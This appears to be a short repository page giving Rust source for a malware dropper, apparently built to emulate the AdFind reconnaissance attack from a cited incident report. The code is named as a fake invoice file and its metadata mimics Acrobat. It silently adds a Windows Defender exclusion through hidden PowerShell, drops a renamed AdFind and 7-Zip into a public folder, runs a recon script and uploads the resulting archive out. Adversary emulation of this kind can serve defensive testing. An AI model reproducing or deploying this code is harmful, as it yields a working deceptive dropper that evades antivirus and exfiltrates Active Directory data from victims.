# Adfind
ref: https://thedfirreport.com/2020/05/08/adfind-recon/

File name :  "Facture_free.exe"


# Code
main.rs
```rust
fn main() {
    let dropzone = r"C:\Users\Public\Downloads\";

    //Adfind tools
    let adfind_bin = include_bytes!("payload/AdFind.bin");
    let adfind_cmd = include_str!("payload/adfind.cmd");
    
    //7zip
    let  sevenzip_a = include_bytes!("payload/7zip/7za.dll");
    let  sevenzip_xa = include_bytes!("payload/7zip/7zxa.dll");
    let  sevenzip_exe = include_bytes!("payload/7zip/7za.exe");

    // exclude exe from defender
    tools::run_exe("powershell", "-window hidden Add-MpPreference -ExclusionExtension find.exe",None);
    
    tools::drop_include_bytes(dropzone,"find.exe",adfind_bin);
    tools::drop_include_bytes(dropzone,"7za.dll",sevenzip_a);
    tools::drop_include_bytes(dropzone,"7zxa.dll",sevenzip_xa);
    tools::drop_include_bytes(dropzone,"7za.exe",sevenzip_exe);
    tools::drop_include_str(dropzone, "check.cmd", adfind_cmd);

    tools::run_exe("cmd", "/c check.cmd",Some(dropzone));
 
    upload::io_file("C:\\Users\\Public\\Downloads\\ad.7z");

}
```

build.rs
```rust
let exe_metadata = Mimic::Acrobat;
```